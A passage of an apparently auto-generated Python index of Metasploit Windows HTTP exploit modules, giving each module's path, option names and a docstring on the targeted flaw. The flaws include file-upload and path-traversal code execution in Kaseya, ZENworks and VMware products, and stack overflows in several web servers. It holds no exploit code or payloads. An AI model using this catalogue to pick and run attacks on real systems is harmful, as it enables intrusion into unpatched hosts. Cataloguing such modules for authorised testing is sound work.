			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_http_hp_pcm_snac_update_domain(object):
		"""
		
        This module exploits a path traversal flaw in the HP ProCurve Manager SNAC Server. The
        vulnerability in the UpdateDomainControllerServlet allows an attacker to upload arbitrary
        files, just having into account binary writes aren't allowed. Additionally, authentication
        can be bypassed in order to upload the file. This module has been tested successfully on
        the SNAC server installed with HP ProCurve Manager 4.0.
      
		"""

		path = 'windows/http/hp_pcm_snac_update_domain'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'

	class windows_http_ezserver_http(object):
		"""
		
        This module exploits a stack buffer overflow in the EZHomeTech EZServer
        for versions 6.4.017 and earlier. If a malicious user sends packets
        containing an overly long string, it may be possible to execute a
        payload remotely. Due to size constraints, this module uses the
        Egghunter technique.
      
		"""

		path = 'windows/http/ezserver_http'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_http_zenworks_uploadservlet(object):
		"""
		
          This module exploits a code execution flaw in Novell ZENworks Configuration Management 10.2.0.
        By exploiting the UploadServlet, an attacker can upload a malicious file outside of the TEMP directory
        and then make a secondary request that allows for arbitrary code execution.
      
		"""

		path = 'windows/http/zenworks_uploadservlet'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'

	class windows_http_kaseya_uploadimage_file_upload(object):
		"""
		
        This module exploits an arbitrary file upload vulnerability found in Kaseya versions below
        6.3.0.2. A malicious user can upload an ASP file to an arbitrary directory without previous
        authentication, leading to arbitrary code execution with IUSR privileges.
      
		"""

		path = 'windows/http/kaseya_uploadimage_file_upload'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			FileDropperDelay = 'FileDropperDelay'

	class windows_http_fdm_auth_header(object):
		"""
		
          This module exploits a stack buffer overflow in Free Download Manager
        Remote Control 2.5 Build 758. When sending a specially crafted
        Authorization header, an attacker may be able to execute arbitrary code.
      
		"""

		path = 'windows/http/fdm_auth_header'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'

	class windows_http_sepm_auth_bypass_rce(object):
		"""
		
        This module exploits three separate vulnerabilities in Symantec Endpoint Protection Manager
        in order to achieve a remote shell on the box as NT AUTHORITY/SYSTEM. The vulnerabilities
        include an authentication bypass, a directory traversal and a privilege escalation to
        get privileged code execution.
      
		"""

		path = 'windows/http/sepm_auth_bypass_rce'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			FileDropperDelay = 'FileDropperDelay'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			required_TARGETURI = 'TARGETURI'

	class windows_http_kaseya_uploader(object):
		"""
		
        This module exploits an arbitrary file upload vulnerability found in Kaseya VSA versions
        between 7 and 9.1. A malicious unauthenticated user can upload an ASP file to an arbitrary
        directory leading to arbitrary code execution with IUSR privileges. This module has been
        tested with Kaseya v7.0.0.17, v8.0.0.10 and v9.0.0.3.
      
		"""

		path = 'windows/http/kaseya_uploader'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			FileDropperDelay = 'FileDropperDelay'

	class windows_http_amlibweb_webquerydll_app(object):
		"""
		
          This module exploits a stack buffer overflow in Amlib's Amlibweb
        Library Management System (NetOpacs). The webquery.dll
        API is available through IIS requests. By specifying
        an overly long string to the 'app' parameter, SeH can be
        reliably overwritten allowing for arbitrary remote code execution.
        In addition, it is possible to overwrite EIP by specifying
        an arbitrary parameter name with an '=' terminator.
      
		"""

		path = 'windows/http/amlibweb_webquerydll_app'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_http_intersystems_cache(object):
		"""
		
          This module exploits a stack buffer overflow in InterSystems Cache 2009.1.
        By sending a specially crafted GET request, an attacker may be able to execute
        arbitrary code.
      
		"""

		path = 'windows/http/intersystems_cache'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'

	class windows_http_vmware_vcenter_chargeback_upload(object):
		"""
		
        This module exploits a code execution flaw in VMware vCenter Chargeback Manager,
        where the ImageUploadServlet servlet allows unauthenticated file upload. The files
        are uploaded to the /cbmui/images/ web path, where JSP code execution is allowed.
        The module has been tested successfully on VMware vCenter Chargeback Manager 2.0.1
        on Windows 2003 SP2.
      
		"""

		path = 'windows/http/vmware_vcenter_chargeback_upload'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			FileDropperDelay = 'FileDropperDelay'

	class windows_http_shttpd_post(object):
		"""
		
          This module exploits a stack buffer overflow in SHTTPD <= 1.34.
        The vulnerability is caused due to a boundary error within the
        handling of POST requests. Based on an original exploit by skOd
        but using a different method found by hdm.
      
		"""

		path = 'windows/http/shttpd_post'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_http_navicopa_get_overflow(object):
		"""
		
        This module exploits a stack buffer overflow in NaviCOPA 2.0.1.
        The vulnerability is caused due to a boundary error within the
        handling of URL parameters.
      
		"""

		path = 'windows/http/navicopa_get_overflow'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_http_minishare_get_overflow(object):
		"""
		
          This is a simple buffer overflow for the minishare web
        server. This flaw affects all versions prior to 1.4.2. This
        is a plain stack buffer overflow that requires a "jmp esp" to reach
        the payload, making this difficult to target many platforms
        at once. This module has been successfully tested against
        1.4.1. Version 1.3.4 and below do not seem to be vulnerable.
      
		"""

		path = 'windows/http/minishare_get_overflow'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
